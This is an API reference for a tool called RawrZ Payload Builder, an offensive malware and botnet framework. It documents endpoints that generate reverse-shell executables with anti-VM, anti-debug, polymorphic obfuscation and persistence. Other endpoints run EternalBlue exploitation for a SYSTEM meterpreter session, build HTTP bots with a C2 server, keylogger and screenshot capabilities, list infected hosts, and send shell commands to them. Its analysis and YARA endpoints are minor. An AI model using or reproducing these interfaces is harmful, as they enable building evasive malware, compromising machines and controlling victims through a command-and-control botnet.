# RawrZ Payload Builder - API Reference 📡

## API Overview

### Base URL
```
Production: https://api.rawrz.io/v1
Development: http://localhost:3000/api/v1
```

### Authentication
All API endpoints require authentication via JWT tokens:
```http
Authorization: Bearer <jwt_token>
```

### Response Format
```json
{
  "success": true,
  "data": { /* response data */ },
  "message": "Operation completed successfully",
  "timestamp": "2024-01-15T10:30:00Z",
  "requestId": "req_123456789"
}
```

### Error Format
```json
{
  "success": false,
  "error": {
    "code": "VALIDATION_ERROR",
    "message": "Invalid input parameters",
    "details": ["Field 'algorithm' is required"]
  },
  "timestamp": "2024-01-15T10:30:00Z",
  "requestId": "req_123456789"
}
```

## Authentication Endpoints

### POST /auth/login
Authenticate user and receive JWT token.

**Request:**
```json
{
  "username": "admin",
  "password": "secure_password",
  "mfa_code": "123456"
}
```

**Response:**
```json
{
  "success": true,
  "data": {
    "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
    "refreshToken": "refresh_token_here",
    "expiresIn": 86400,
    "user": {
      "id": "user_123",
      "username": "admin",
      "permissions": ["encrypt", "decrypt", "generate", "admin"]
    }
  }
}
```

### POST /auth/refresh
Refresh JWT token using refresh token.

**Request:**
```json
{
  "refreshToken": "refresh_token_here"
}
```

### POST /auth/logout
Invalidate current session.

**Request:**
```json
{
  "token": "current_jwt_token"
}
```

## Encryption Endpoints

### POST /encryption/encrypt
Encrypt data using specified algorithm.

**Request:**
```json
{
  "data": "sensitive data to encrypt",
  "algorithm": "aes-256-gcm",
  "password": "encryption_password",
  "options": {
    "keyDerivation": "argon2",
    "iterations": 100000,
    "saltLength": 32,
    "outputFormat": "base64"
  }
}
```

**Response:**
```json
{
  "success": true,
  "data": {
    "encrypted": "base64_encrypted_data",
    "iv": "initialization_vector",
    "salt": "random_salt",
    "tag": "authentication_tag",
    "algorithm": "aes-256-gcm",
    "keyDerivation": "argon2"
  }
}
```

### POST /encryption/decrypt
Decrypt previously encrypted data.

**Request:**
```json
{
  "encrypted": "base64_encrypted_data",
  "password": "encryption_password",
  "iv": "initialization_vector",
  "salt": "random_salt",
  "tag": "authentication_tag",
  "algorithm": "aes-256-gcm",
  "keyDerivation": "argon2"
}
```

**Response:**
```json
{
  "success": true,
  "data": {
    "decrypted": "original sensitive data",
    "verified": true
  }
}
```

### POST /encryption/file
Encrypt file contents.

**Request (multipart/form-data):**
```
file: [binary file data]
algorithm: aes-256-gcm
password: encryption_password
compress: true
```

**Response:**
```json
{
  "success": true,
  "data": {
    "encryptedFile": "base64_encrypted_file",
    "originalSize": 1024,
    "encryptedSize": 1156,
    "compressionRatio": 0.85,
    "metadata": {
      "filename": "document.pdf",
      "mimeType": "application/pdf",
      "encrypted": "2024-01-15T10:30:00Z"
    }
  }
}
```

### GET /encryption/algorithms
List available encryption algorithms.

**Response:**
```json
{
  "success": true,
  "data": {
    "symmetric": [
      {
        "name": "aes-256-gcm",
        "keySize": 256,
        "blockSize": 128,
        "mode": "GCM",
        "authenticated": true,
        "recommended": true
      },
      {
        "name": "chacha20-poly1305",
        "keySize": 256,
        "streamCipher": true,
        "authenticated": true,
        "recommended": true
      }
    ],
    "asymmetric": [
      {
        "name": "rsa-4096",
        "keySize": 4096,
        "type": "RSA",
        "recommended": true
      },
      {
        "name": "ecc-p521",
        "keySize": 521,
        "type": "ECC",
        "curve": "P-521",
        "recommended": true
      }
    ]
  }
}
```

## Payload Generation Endpoints

### POST /payload/generate
Generate payload with specified configuration.

**Request:**
```json
{
  "type": "exe",
  "architecture": "x64",
  "payload": {
    "type": "reverse_shell",
    "host": "192.168.1.100",
    "port": 4444
  },
  "encryption": {
    "enabled": true,
    "algorithm": "aes-256-gcm",
    "password": "payload_password"
  },
  "evasion": {
    "antiVM": true,
    "antiDebug": true,
    "polymorphic": true,
    "obfuscationLevel": "high"
  },
  "options": {
    "compression": true,
    "signing": false,
    "persistence": true
  }
}
```

**Response:**
```json
{
  "success": true,
  "data": {
    "payloadId": "payload_123456",
    "payload": "base64_encoded_payload",
    "size": 2048576,
    "hash": {
      "md5": "5d41402abc4b2a76b9719d911017c592",
      "sha1": "aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d",
      "sha256": "2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae"
    },
    "metadata": {
      "type": "exe",
      "architecture": "x64",
      "encrypted": true,
      "obfuscated": true,
      "generated": "2024-01-15T10:30:00Z"
    }
  }
}
```

### GET /payload/types
List available payload types.

**Response:**
```json
{
  "success": true,
  "data": {
    "windows": [
      {
        "type": "exe",
        "description": "Windows executable",
        "architectures": ["x86", "x64"],
        "extensions": [".exe"]
      },
      {
        "type": "dll",
        "description": "Dynamic Link Library",
        "architectures": ["x86", "x64"],
        "extensions": [".dll"]
      },
      {
        "type": "powershell",
        "description": "PowerShell script",
        "architectures": ["any"],
        "extensions": [".ps1"]
      }
    ],
    "linux": [
      {
        "type": "elf",
        "description": "Linux executable",
        "architectures": ["x86", "x64", "arm", "arm64"],
        "extensions": [""]
      },
      {
        "type": "shell",
        "description": "Shell script",
        "architectures": ["any"],
        "extensions": [".sh"]
      }
    ],
    "cross_platform": [
      {
        "type": "java",
        "description": "Java bytecode",
        "architectures": ["any"],
        "extensions": [".jar", ".class"]
      },
      {
        "type": "python",
        "description": "Python script",
        "architectures": ["any"],
        "extensions": [".py", ".pyc"]
      }
    ]
  }
}
```

### POST /payload/obfuscate
Apply obfuscation to existing payload.

**Request:**
```json
{
  "payload": "base64_encoded_payload",
  "obfuscation": {
    "level": "extreme",
    "techniques": [
      "control_flow_flattening",
      "string_encryption",
      "api_hashing",
      "dead_code_insertion"
    ],
    "polymorphic": true,
    "antiAnalysis": true
  }
}
```

**Response:**
```json
{
  "success": true,
  "data": {
    "obfuscatedPayload": "base64_obfuscated_payload",
    "originalSize": 1024,
    "obfuscatedSize": 2048,
    "techniques": [
      "control_flow_flattening",
      "string_encryption",
      "api_hashing",
      "dead_code_insertion",
      "polymorphic_transformation"
    ],
    "entropy": 7.8,
    "obfuscationRatio": 2.0
  }
}
```

## Analysis Endpoints

### POST /analysis/scan
Scan file or payload for analysis.

**Request (multipart/form-data):**
```
file: [binary file data]
scanType: comprehensive
engines: ["static", "dynamic", "behavioral"]
```

**Response:**
```json
{
  "success": true,
  "data": {
    "scanId": "scan_123456",
    "status": "completed",
    "results": {
      "static": {
        "fileType": "PE32+ executable",
        "architecture": "x64",
        "compiler": "Microsoft Visual C++",
        "entropy": 7.2,
        "sections": [
          {
            "name": ".text",
            "virtualSize": 4096,
            "rawSize": 4096,
            "entropy": 6.8,
            "suspicious": false
          }
        ],
        "imports": [
          {
            "dll": "kernel32.dll",
            "functions": ["CreateFileA", "WriteFile", "CloseHandle"]
          }
        ],
        "strings": [
          "Hello World",
          "C:\\Windows\\System32"
        ]
      },
      "dynamic": {
        "executed": true,
        "runtime": 30.5,
        "processes": [
          {
            "name": "sample.exe",
            "pid": 1234,
            "parentPid": 5678
          }
        ],
        "network": [
          {
            "protocol": "TCP",
            "destination": "192.168.1.100:4444",
            "bytes": 1024
          }
        ],
        "files": [
          {
            "path": "C:\\temp\\dropped.exe",
            "action": "created",
            "size": 2048
          }
        ]
      },
      "behavioral": {
        "classification": "trojan",
        "confidence": 0.85,
        "behaviors": [
          "network_communication",
          "file_creation",
          "registry_modification"
        ]
      }
    },
    "threats": [
      {
        "type": "network_callback",
        "severity": "high",
        "description": "Establishes network connection to external host"
      }
    ]
  }
}
```

### GET /analysis/scan/{scanId}
Get analysis results by scan ID.

**Response:**
```json
{
  "success": true,
  "data": {
    "scanId": "scan_123456",
    "status": "completed",
    "progress": 100,
    "startTime": "2024-01-15T10:30:00Z",
    "endTime": "2024-01-15T10:35:00Z",
    "results": { /* analysis results */ }
  }
}
```

### POST /analysis/yara
Scan with YARA rules.

**Request:**
```json
{
  "data": "base64_encoded_data",
  "rules": [
    "rule MalwareDetection { strings: $a = \"malware\" condition: $a }",
    "rule SuspiciousAPI { strings: $b = \"CreateRemoteThread\" condition: $b }"
  ],
  "customRules": true
}
```

**Response:**
```json
{
  "success": true,
  "data": {
    "matches": [
      {
        "rule": "SuspiciousAPI",
        "matches": [
          {
            "offset": 1024,
            "length": 17,
            "identifier": "$b",
            "data": "CreateRemoteThread"
          }
        ]
      }
    ],
    "totalMatches": 1,
    "scanTime": 0.15
  }
}
```

## Network Endpoints

### POST /network/scan
Perform network scan.

**Request:**
```json
{
  "target": "192.168.1.0/24",
  "ports": [22, 80, 443, 3389],
  "scanType": "tcp_syn",
  "timeout": 5000,
  "options": {
    "serviceDetection": true,
    "osDetection": true,
    "scriptScan": false
  }
}
```

**Response:**
```json
{
  "success": true,
  "data": {
    "scanId": "scan_789012",
    "targets": 254,
    "hostsUp": 12,
    "results": [
      {
        "host": "192.168.1.100",
        "status": "up",
        "ports": [
          {
            "port": 22,
            "protocol": "tcp",
            "state": "open",
            "service": "ssh",
            "version": "OpenSSH 8.0"
          },
          {
            "port": 80,
            "protocol": "tcp",
            "state": "open",
            "service": "http",
            "version": "Apache 2.4.41"
          }
        ],
        "os": {
          "name": "Linux",
          "version": "Ubuntu 20.04",
          "confidence": 95
        }
      }
    ],
    "scanTime": 45.2
  }
}
```

### POST /network/exploit
Attempt exploitation of discovered vulnerabilities.

**Request:**
```json
{
  "target": "192.168.1.100",
  "port": 445,
  "exploit": "ms17_010_eternalblue",
  "payload": {
    "type": "reverse_shell",
    "host": "192.168.1.50",
    "port": 4444
  },
  "options": {
    "verify": true,
    "cleanup": true
  }
}
```

**Response:**
```json
{
  "success": true,
  "data": {
    "exploitId": "exploit_345678",
    "status": "success",
    "target": "192.168.1.100:445",
    "exploit": "ms17_010_eternalblue",
    "session": {
      "id": "session_901234",
      "type": "meterpreter",
      "user": "NT AUTHORITY\\SYSTEM",
      "os": "Windows 10 Pro",
      "architecture": "x64"
    },
    "executionTime": 12.5
  }
}
```

## Bot Management Endpoints

### POST /bots/generate
Generate bot payload.

**Request:**
```json
{
  "type": "http",
  "c2Server": "https://c2.example.com",
  "beaconInterval": 60,
  "jitter": 0.2,
  "encryption": {
    "enabled": true,
    "algorithm": "aes-256-gcm",
    "key": "encryption_key"
  },
  "capabilities": [
    "file_operations",
    "shell_execution",
    "screenshot",
    "keylogger"
  ],
  "persistence": {
    "enabled": true,
    "method": "registry"
  }
}
```

**Response:**
```json
{
  "success": true,
  "data": {
    "botId": "bot_567890",
    "payload": "base64_bot_payload",
    "config": {
      "c2Server": "https://c2.example.com",
      "beaconInterval": 60,
      "jitter": 0.2,
      "encryption": true
    },
    "size": 1048576,
    "hash": "sha256_hash_here"
  }
}
```

### GET /bots/active
List active bot sessions.

**Response:**
```json
{
  "success": true,
  "data": {
    "totalBots": 25,
    "activeBots": 18,
    "bots": [
      {
        "botId": "bot_567890",
        "ip": "192.168.1.100",
        "hostname": "DESKTOP-ABC123",
        "user": "john.doe",
        "os": "Windows 10 Pro",
        "lastSeen": "2024-01-15T10:30:00Z",
        "status": "active",
        "capabilities": ["file_operations", "shell_execution"]
      }
    ]
  }
}
```

### POST /bots/{botId}/command
Send command to specific bot.

**Request:**
```json
{
  "command": "shell",
  "parameters": {
    "cmd": "whoami"
  },
  "timeout": 30
}
```

**Response:**
```json
{
  "success": true,
  "data": {
    "commandId": "cmd_123456",
    "status": "executed",
    "output": "DESKTOP-ABC123\\john.doe",
    "executionTime": 0.5,
    "timestamp": "2024-01-15T10:30:00Z"
  }
}
```

## File Operations Endpoints

### POST /files/hash
Calculate file hashes.

**Request (multipart/form-data):**
```
file: [binary file data]
algorithms: ["md5", "sha1", "sha256", "sha512"]
```

**Response:**
```json
{
  "success": true,
  "data": {
    "filename": "document.pdf",
    "size": 1048576,
    "hashes": {
      "md5": "5d41402abc4b2a76b9719d911017c592",
      "sha1": "aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d",
      "sha256": "2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae",
      "sha512": "9b71d224bd62f3785d96d46ad3ea3d73319bfbc2890caadae2dff72519673ca72323c3d99ba5c11d7c7acc6e14b8c5da0c4663475c2e5c3adef46f73bcdec043"
    }
  }
}
```

### POST /files/compress
Compress file or data.

**Request:**
```json
{
  "data": "base64_encoded_data",
  "algorithm": "gzip",
  "level": 9
}
```

**Response:**
```json
{
  "success": true,
  "data": {
    "compressed": "base64_compressed_data",
    "originalSize": 1024,
    "compressedSize": 512,
    "compressionRatio": 0.5,
    "algorithm": "gzip"
  }
}
```

### POST /files/steganography
Hide data in image files.

**Request (multipart/form-data):**
```
image: [image file]
data: secret message
method: lsb
password: stego_password
```

**Response:**
```json
{
  "success": true,
  "data": {
    "stegoImage": "base64_encoded_image",
    "capacity": 1024,
    "used": 256,
    "method": "lsb",
    "encrypted": true
  }
}
```

## System Information Endpoints

### GET /system/info
Get system information.

**Response:**
```json
{
  "success": true,
  "data": {
    "system": {
      "platform": "win32",
      "architecture": "x64",
      "hostname": "RAWRZ-SERVER",
      "uptime": 86400,
      "loadAverage": [0.5, 0.3, 0.2]
    },
    "memory": {
      "total": 17179869184,
      "free": 8589934592,
      "used": 8589934592,
      "percentage": 50
    },
    "cpu": {
      "model": "Intel Core i7-9700K",
      "cores": 8,
      "speed": 3600,
      "usage": 25.5
    },
    "disk": [
      {
        "filesystem": "C:",
        "size": 1099511627776,
        "used": 549755813888,
        "available": 549755813888,
        "percentage": 50
      }
    ],
    "network": [
      {
        "interface": "Ethernet",
        "ip": "192.168.1.100",
        "mac": "00:11:22:33:44:55",
        "status": "up"
      }
    ]
  }
}
```

### GET /system/health
Get system health status.

**Response:**
```json
{
  "success": true,
  "data": {
    "status": "healthy",
    "checks": {
      "database": {
        "status": "healthy",
        "responseTime": 15,
        "connections": 5
      },
      "memory": {
        "status": "healthy",
        "usage": 50,
        "threshold": 80
      },
      "disk": {
        "status": "healthy",
        "usage": 50,
        "threshold": 90
      },
      "engines": {
        "status": "healthy",
        "active": 12,
        "total": 12
      }
    },
    "uptime": 86400,
    "version": "2.1.0"
  }
}
```

## Configuration Endpoints

### GET /config
Get current configuration.

**Response:**
```json
{
  "success": true,
  "data": {
    "encryption": {
      "defaultAlgorithm": "aes-256-gcm",
      "keyDerivation": "argon2",
      "iterations": 100000
    },
    "evasion": {
      "antiVM": true,
      "antiDebug": true,
      "polymorphic": true
    },
    "logging": {
      "level": "info",
      "auditEnabled": true
    },
    "security": {
      "rateLimitEnabled": true,
      "maxRequestsPerHour": 1000
    }
  }
}
```

### PUT /config
Update configuration.

**Request:**
```json
{
  "encryption": {
    "defaultAlgorithm": "chacha20-poly1305",
    "iterations": 150000
  },
  "logging": {
    "level": "debug"
  }
}
```

**Response:**
```json
{
  "success": true,
  "data": {
    "updated": true,
    "changes": [
      "encryption.defaultAlgorithm",
      "encryption.iterations",
      "logging.level"
    ],
    "timestamp": "2024-01-15T10:30:00Z"
  }
}
```

## WebSocket API

### Connection
```javascript
const ws = new WebSocket('wss://api.rawrz.io/v1/ws');

// Authentication
ws.send(JSON.stringify({
  type: 'auth',
  token: 'jwt_token_here'
}));
```

### Real-time Events
```javascript
// Bot status updates
{
  "type": "bot_status",
  "data": {
    "botId": "bot_567890",
    "status": "online",
    "lastSeen": "2024-01-15T10:30:00Z"
  }
}

// Scan progress updates
{
  "type": "scan_progress",
  "data": {
    "scanId": "scan_123456",
    "progress": 75,
    "stage": "dynamic_analysis"
  }
}

// System alerts
{
  "type": "system_alert",
  "data": {
    "level": "warning",
    "message": "High memory usage detected",
    "timestamp": "2024-01-15T10:30:00Z"
  }
}
```

## Rate Limits

### Default Limits
- **Authentication**: 10 requests per minute
- **Encryption/Decryption**: 100 requests per hour
- **Payload Generation**: 50 requests per hour
- **Analysis**: 20 requests per hour
- **Network Operations**: 10 requests per hour

### Headers
```http
X-RateLimit-Limit: 100
X-RateLimit-Remaining: 95
X-RateLimit-Reset: 1642248600
```

## Error Codes

### HTTP Status Codes
- `200` - Success
- `201` - Created
- `400` - Bad Request
- `401` - Unauthorized
- `403` - Forbidden
- `404` - Not Found
- `429` - Too Many Requests
- `500` - Internal Server Error

### Custom Error Codes
- `INVALID_TOKEN` - JWT token is invalid or expired
- `INSUFFICIENT_PERMISSIONS` - User lacks required permissions
- `VALIDATION_ERROR` - Request validation failed
- `ENCRYPTION_ERROR` - Encryption/decryption operation failed
- `GENERATION_ERROR` - Payload generation failed
- `ANALYSIS_ERROR` - Analysis operation failed
- `NETWORK_ERROR` - Network operation failed
- `SYSTEM_ERROR` - System-level error occurred

This API reference provides comprehensive documentation for all available endpoints, request/response formats, authentication, and error handling in the RawrZ Payload Builder API.